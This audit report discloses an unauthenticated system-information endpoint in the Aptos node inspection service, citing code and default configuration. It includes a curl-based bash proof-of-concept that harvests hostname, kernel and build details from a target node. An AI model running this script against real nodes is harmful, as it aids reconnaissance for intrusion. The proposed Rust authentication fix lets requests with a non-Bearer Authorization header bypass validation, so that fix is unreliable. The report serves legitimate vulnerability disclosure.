# Audit Report

## Title
Unauthenticated System Information Disclosure via Inspection Service Endpoint

## Summary
The `/system_information` endpoint in the Aptos inspection service lacks authentication controls, allowing any network-accessible client to query sensitive system and build information when the endpoint is enabled (which is the default configuration). The service binds to `0.0.0.0:9101` by default, making it accessible from all network interfaces.

## Finding Description
The `handle_system_information_request()` function in the inspection service only checks whether the endpoint is enabled via configuration, but performs no authentication or authorization checks before returning sensitive system information. [1](#0-0) 

The endpoint is exposed through the HTTP server without any authentication middleware: [2](#0-1) 

A comprehensive grep search for authentication-related terms (auth, bearer, token) in the entire inspection service crate returned zero results, confirming no authentication mechanism is implemented.

The default configuration enables this endpoint and binds to all network interfaces: [3](#0-2) 

The exposed information includes:

**System Information** (collected from the `sysinfo` crate): [4](#0-3) 

**Build Information** (including git metadata and compilation details): [5](#0-4) 

Both information sets are combined and returned as JSON: [6](#0-5) 

### Attack Scenario
1. Attacker scans for nodes with port 9101 open
2. Sends HTTP GET request: `curl http://<node-ip>:9101/system_information`
3. Receives JSON response containing:
   - Hostname (reconnaissance)
   - OS version and kernel version (exploit targeting)
   - Build commit hash and branch (version identification for known vulnerabilities)
   - CPU and memory specifications (resource exhaustion planning)
   - Build time and environment details

This information enables targeted attacks by:
- Identifying the exact software version to exploit known vulnerabilities
- Fingerprinting the deployment environment
- Planning resource exhaustion attacks based on actual system resources
- Mapping network topology via hostnames

## Impact Explanation
This qualifies as **Medium Severity** information disclosure under the Aptos bug bounty program. While it doesn't directly cause fund loss or consensus violations, it significantly aids attackers in reconnaissance and targeted exploitation:

1. **Version Identification**: The build commit hash allows attackers to identify the exact codebase version and search for known vulnerabilities in that specific version
2. **System Fingerprinting**: OS/kernel version information enables targeted exploit selection
3. **Attack Surface Mapping**: Hostname and system specifications reveal deployment topology
4. **Resource-Based Attacks**: Memory and CPU information helps plan DoS or resource exhaustion strategies

While Kubernetes deployments may have NetworkPolicy protection, this only applies if explicitly enabled: [7](#0-6) 

Bare metal deployments, cloud VMs without proper security groups, or Kubernetes clusters with `enableNetworkPolicy: false` remain vulnerable.

## Likelihood Explanation
**HIGH likelihood** in misconfigured deployments:
- Default configuration exposes the endpoint (`expose_system_information: true`)
- Default binding to `0.0.0.0` makes it network-accessible
- No authentication required
- Simple exploitation (single HTTP GET request)
- Common deployment misconfigurations (missing firewall rules, disabled NetworkPolicies)

For testnet/devnet nodes, this is **near-certain** as the config optimizer automatically enables all inspection endpoints for non-mainnet chains: [8](#0-7) 

## Recommendation

Implement one or more of the following security controls:

### Option 1: Add Authentication (Recommended)
Implement bearer token authentication similar to other Aptos services:
```rust
// In serve_requests function, add authentication check
async fn serve_requests(
    req: Request<Body>,
    node_config: NodeConfig,
    // ... other params
) -> Result<Response<Body>, hyper::Error> {
    // Extract and validate bearer token from Authorization header
    if let Some(auth_header) = req.headers().get("Authorization") {
        if let Ok(auth_str) = auth_header.to_str() {
            if auth_str.starts_with("Bearer ") {
                let token = &auth_str[7..];
                // Validate token against configured secret
                if !validate_inspection_token(token, &node_config) {
                    return Ok(unauthorized_response());
                }
            }
        }
    } else {
        return Ok(unauthorized_response());
    }
    
    // Existing routing logic...
}
```

Add to `InspectionServiceConfig`:
```rust
pub struct InspectionServiceConfig {
    // ... existing fields
    pub auth_token: Option<String>, // Optional bearer token for authentication
}
```

### Option 2: Bind to Localhost by Default
Change the default binding address:
```rust
fn default() -> InspectionServiceConfig {
    InspectionServiceConfig {
        address: "127.0.0.1".to_string(), // Changed from 0.0.0.0
        // ... rest of defaults
    }
}
```

### Option 3: Disable by Default for Production
Set `expose_system_information: false` by default and require explicit opt-in, with clear documentation about security implications.

**Recommended approach**: Combine Option 1 (authentication) with updated documentation emphasizing that operators should either enable authentication or ensure proper firewall/NetworkPolicy rules are in place.

## Proof of Concept

### Setup
1. Start an Aptos node with default inspection service configuration
2. Ensure port 9101 is accessible from your test machine

### Exploitation
```bash
#!/bin/bash
# PoC: Unauthenticated System Information Disclosure

NODE_IP="<target-node-ip>"
PORT="9101"

echo "[*] Attempting to access system information endpoint..."
response=$(curl -s "http://${NODE_IP}:${PORT}/system_information")

if [ $? -eq 0 ]; then
    echo "[+] Successfully accessed endpoint without authentication!"
    echo "[+] Exposed information:"
    echo "$response" | jq '.'
    
    # Extract critical information
    echo ""
    echo "[+] Critical Information Leaked:"
    echo "    Hostname: $(echo "$response" | jq -r '.system_host_name // "N/A"')"
    echo "    OS Version: $(echo "$response" | jq -r '.system_os_version // "N/A"')"
    echo "    Kernel: $(echo "$response" | jq -r '.system_kernel_version // "N/A"')"
    echo "    Build Commit: $(echo "$response" | jq -r '.build_commit_hash // "N/A"')"
    echo "    Build Branch: $(echo "$response" | jq -r '.build_branch // "N/A"')"
    echo "    CPU Count: $(echo "$response" | jq -r '.cpu_count // "N/A"')"
    echo "    Memory Total: $(echo "$response" | jq -r '.memory_total // "N/A"')"
else
    echo "[-] Failed to access endpoint (may be firewalled or disabled)"
fi
```

### Expected Output
```json
{
  "build_branch": "main",
  "build_commit_hash": "abc123def456...",
  "build_time": "2024-01-15 10:30:00",
  "cpu_brand": "Intel(R) Xeon(R) CPU @ 2.50GHz",
  "cpu_count": "16",
  "memory_total": "67108864",
  "system_host_name": "validator-node-001",
  "system_kernel_version": "5.15.0-1027-gcp",
  "system_name": "Linux",
  "system_os_version": "Ubuntu 22.04.1 LTS"
}
```

This demonstrates that any attacker can retrieve sensitive system and build information without providing any credentials, enabling targeted reconnaissance and exploitation.

## Notes

While the Kubernetes NetworkPolicy configuration does restrict access to port 9101 in properly configured deployments, this protection is:
1. Optional (requires `enableNetworkPolicy: true`)
2. Only applicable to Kubernetes deployments
3. Still allows access from monitoring and health-checker pods in any namespace

The fundamental security issue remains: the endpoint lacks application-level authentication, violating defense-in-depth principles and leaving bare metal, VM, and misconfigured Kubernetes deployments vulnerable to information disclosure.

### Citations

**File:** crates/aptos-inspection-service/src/server/system_information.rs (L14-29)
```rust
pub fn handle_system_information_request(node_config: NodeConfig) -> (StatusCode, Body, String) {
    // Only return system information if the endpoint is enabled
    if node_config.inspection_service.expose_system_information {
        (
            StatusCode::OK,
            Body::from(get_system_information_json()),
            CONTENT_TYPE_JSON.into(),
        )
    } else {
        (
            StatusCode::FORBIDDEN,
            Body::from(SYS_INFO_DISABLED_MESSAGE),
            CONTENT_TYPE_TEXT.into(),
        )
    }
}
```

**File:** crates/aptos-inspection-service/src/server/system_information.rs (L32-42)
```rust
fn get_system_information_json() -> String {
    // Get the system and build information
    let mut system_information = aptos_telemetry::system_information::get_system_information();
    system_information.extend(build_information!());

    // Return the system information as a JSON string
    match serde_json::to_string(&system_information) {
        Ok(system_information) => system_information,
        Err(error) => format!("Failed to get system information! Error: {}", error),
    }
}
```

**File:** crates/aptos-inspection-service/src/server/mod.rs (L156-160)
```rust
        SYSTEM_INFORMATION_PATH => {
            // /system_information
            // Exposes the system and build information
            system_information::handle_system_information_request(node_config)
        },
```

**File:** config/src/config/inspection_service_config.rs (L26-37)
```rust
impl Default for InspectionServiceConfig {
    fn default() -> InspectionServiceConfig {
        InspectionServiceConfig {
            address: "0.0.0.0".to_string(),
            port: 9101,
            expose_configuration: false,
            expose_identity_information: true,
            expose_peer_information: true,
            expose_system_information: true,
        }
    }
}
```

**File:** config/src/config/inspection_service_config.rs (L100-103)
```rust
                if local_inspection_config_yaml["expose_system_information"].is_null() {
                    inspection_service_config.expose_system_information = true;
                    modified_config = true;
                }
```

**File:** crates/aptos-telemetry/src/system_information.rs (L14-33)
```rust
/// System information keys
const CPU_BRAND: &str = "cpu_brand";
const CPU_COUNT: &str = "cpu_count";
const CPU_CORE_COUNT: &str = "cpu_core_count";
const CPU_FREQUENCY: &str = "cpu_frequency";
const CPU_NAME: &str = "cpu_name";
const CPU_VENDOR_ID: &str = "cpu_vendor_id";
const DISK_AVAILABLE_SPACE: &str = "disk_available_space";
const DISK_COUNT: &str = "disk_count";
const DISK_FILE_SYSTEM: &str = "disk_file_system";
const DISK_NAME: &str = "disk_name";
const DISK_TOTAL_SPACE: &str = "disk_total_space";
const DISK_TYPE: &str = "disk_type";
const MEMORY_AVAILABLE: &str = "memory_available";
const MEMORY_TOTAL: &str = "memory_total";
const MEMORY_USED: &str = "memory_used";
const SYSTEM_HOST_NAME: &str = "system_host_name";
const SYSTEM_KERNEL_VERSION: &str = "system_kernel_version";
const SYSTEM_NAME: &str = "system_name";
const SYSTEM_OS_VERSION: &str = "system_os_version";
```

**File:** crates/aptos-build-info/src/lib.rs (L7-20)
```rust
/// Build information keys
pub const BUILD_BRANCH: &str = "build_branch";
pub const BUILD_CARGO_VERSION: &str = "build_cargo_version";
pub const BUILD_CLEAN_CHECKOUT: &str = "build_clean_checkout";
pub const BUILD_COMMIT_HASH: &str = "build_commit_hash";
pub const BUILD_TAG: &str = "build_tag";
pub const BUILD_TIME: &str = "build_time";
pub const BUILD_OS: &str = "build_os";
pub const BUILD_PKG_VERSION: &str = "build_pkg_version";
pub const BUILD_RUST_CHANNEL: &str = "build_rust_channel";
pub const BUILD_RUST_VERSION: &str = "build_rust_version";
pub const BUILD_IS_RELEASE_BUILD: &str = "build_is_release_build";
pub const BUILD_PROFILE_NAME: &str = "build_profile_name";
pub const BUILD_USING_TOKIO_UNSTABLE: &str = "build_using_tokio_unstable";
```

**File:** terraform/helm/aptos-node/templates/networkpolicy.yaml (L1-1)
```yaml
{{- if .Values.validator.enableNetworkPolicy }}
```
